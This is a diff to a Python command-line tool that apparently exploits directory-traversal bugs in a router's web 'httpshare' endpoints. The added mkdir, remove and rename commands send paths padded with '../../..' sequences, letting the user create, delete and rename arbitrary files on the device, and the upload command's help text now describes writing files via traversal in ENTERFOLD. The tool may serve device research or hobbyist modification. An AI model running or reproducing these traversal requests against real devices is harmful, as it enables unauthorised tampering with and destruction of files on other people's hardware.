@@ -320,10 +320,37 @@ def main():
 
     # define parser for upload_file command
     upload_file_parser = subparsers.add_parser('upload_file', 
-                    help='Lists the contents of directory using directory traversal bug')
+                    help='Uses directory traversal in ENTERFOLD to write file into /tmp directory')
     upload_file_parser.add_argument("path",
                     type=str,
                     help="path of the file you wish to upload to /tmp")
+
+    # define parser for mkdir
+    mkdir_parser = subparsers.add_parser('mkdir',
+                    help='creates a directory in specified location (provided it is in a writable location)')
+    mkdir_parser.add_argument("path",
+                    type=str,
+                    help="absolute path of the directory that will be created")
+
+    # define parser for remove
+    remove_parser = subparsers.add_parser('remove',
+                    help='removes file in specified location (provided it is in a writable location)')
+    remove_parser.add_argument("path",
+                    type=str,
+                    help="absolute path of the directory containing the file that will be deleted")
+    remove_parser.add_argument("filename",
+                    type=str,
+                    help="filename of file to be deleted")
+
+    # define parser for rename
+    rename_parser = subparsers.add_parser('rename',
+                    help='rename file at specified path (provided it is in a writable location)')
+    rename_parser.add_argument("old_filename",
+                    type=str,
+                    help="the current name of the file (full path)")
+    rename_parser.add_argument("new_filename",
+                    type=str,
+                    help="the new name of the file (new path)") 
 
     # define parser for arb_cfg_clear_v1 command
     arb_cfg_clear_v1_parser = subparsers.add_parser('arb_cfg_clear_v1', 
@@ -404,6 +431,12 @@ def main():
         if (arguments.admin_pwd != ''):
             goform_set(GOFORM_LOGIN(arguments.admin_pwd), arguments.router_ip)
         goform_get(arguments.key, arguments.router_ip)
+    elif (arguments.command == 'mkdir'):
+        goform_set(GOFORM_HTTPSHARE_NEW(f"//../../../../../../../..{arguments.path}", "2024-08-08 22:22:22", "1723151393"), arguments.router_ip)
+    elif arguments.command == 'remove':
+        goform_set(GOFORM_HTTPSHARE_DEL(f"//mmc2/./../../../../../../../..{arguments.path}", arguments.filename + '*'), arguments.router_ip)
+    elif (arguments.command == 'rename'):
+        goform_set(GOFORM_HTTPSHARE_FILE_RENAME(f"/../../../../../../../..{arguments.old_filename}", f"/../../../../../../../..{arguments.new_filename}"), arguments.router_ip)
     elif (arguments.command == 'flappy'):
         upload_generic_file("images/flappy_bg.rgb", arguments.router_ip)
         print()
